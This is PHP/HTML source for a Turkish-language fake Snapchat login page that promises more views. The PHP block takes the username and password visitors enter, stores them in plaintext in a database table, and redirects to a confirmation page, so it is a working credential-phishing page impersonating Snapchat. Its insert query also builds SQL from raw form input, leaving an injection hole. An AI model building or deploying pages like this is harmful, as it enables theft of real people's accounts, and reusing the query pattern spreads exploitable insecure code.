
<?php 
include('veritabanibaglanti.php');

if(isset($_POST["snap_button"])) {

    if (empty($_POST["schat_username"]) || empty($_POST["schat_password"])) {
        
    } else {
        $snapchat_username = $_POST["schat_username"];
        $snapchat_password = $_POST["schat_password"];

        $snapchat_sql_ekle = "INSERT INTO snapchat_users (schat_username, schat_password) VALUES ('$snapchat_username', '$snapchat_password')";

        $snapchat_sql_ekle_calistir = mysqli_query($snapchat_baglanti, $snapchat_sql_ekle);

        header("Refresh: 1.5; URL=onaylandi.php");
        exit();

        mysqli_close($snapchat_baglanti);

    }
}

?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Giriş</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color:rgb(240, 237, 77); 
        }

        .login-container {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 400px;
            position: relative;
            animation: fadeIn 1s ease;
        }

        .login-container h1 {
            font-size: 1.8rem;
            color: #333;
            margin-bottom: 1rem;
        }

        .login-container p {
            font-size: 0.9rem;
            color: #555;
            margin-bottom: 2rem;
        }

        .login-container form {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        .login-container input {
            padding: 0.8rem;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 1rem;
            transition: border 0.3s ease;
        }

        .login-container input:focus {
            border-color:rgb(223, 221, 126); 
            outline: none;
        }

        .login-container button {
            background-color:rgb(219, 216, 51); 
            color: black;
            font-size: 1rem;
            padding: 0.8rem;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.2s;
        }

        .login-container button:hover {
            background-color:rgb(224, 224, 150); 
            transform: scale(1.05);
        }

        .login-container a {
            font-size: 0.9rem;
            color:rgb(230, 226, 39); 
            text-decoration: none;
            margin-top: 1rem;
            display: inline-block;
        }

        .login-container a:hover {
            text-decoration: underline;
        }

        .login-container .icon {
            font-size: 4rem;
            color:rgb(235, 232, 49); 
            margin-bottom: 1rem;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

    </style>
</head>
<body>
    <div class="login-container">
        <i class="fab fa-snapchat-ghost icon"></i>
        <h1>Snapchat İzlenme</h1>
        <p>Lütfen kullanıcı adını ve şifrenizi doğru yazın ve hesabınızın <br> herkese açık olduğundan emin olun!</p>
        <form action="#" method="POST">
            <input type="text" name="schat_username" placeholder="Kullanıcı Adı" required>
            <input type="password" name="schat_password" placeholder="Şifre" required>
            <button name="snap_button" type="submit">Onayla</button>
        </form>
        <a href="main.php">Ana Sayfaya Dön</a>
    </div>
</body>
</html>
